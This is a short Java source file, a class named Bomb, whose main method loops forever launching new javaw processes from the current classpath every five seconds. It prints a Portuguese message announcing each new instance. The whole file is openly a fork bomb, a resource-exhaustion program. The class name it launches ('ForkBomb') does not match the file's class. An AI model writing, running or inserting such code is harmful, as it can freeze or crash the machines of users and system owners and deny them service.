package main;

import java.io.IOException;

/**
 * @author amaranth.rosa
 */
public class Bomb {

	public static void main(String[] args) {
		executeForkBomb();
	}

	public static void executeForkBomb() {

		while (true) {

			try {
				Runtime.getRuntime()
						.exec(new String[] { "javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb" });

				System.out.println("Nova instância criada!");

				Thread.sleep(5000);
			} catch (InterruptedException e1) {
				e1.printStackTrace();
			} catch (IOException e2) {
				e2.printStackTrace();
			}
		}

	}
}
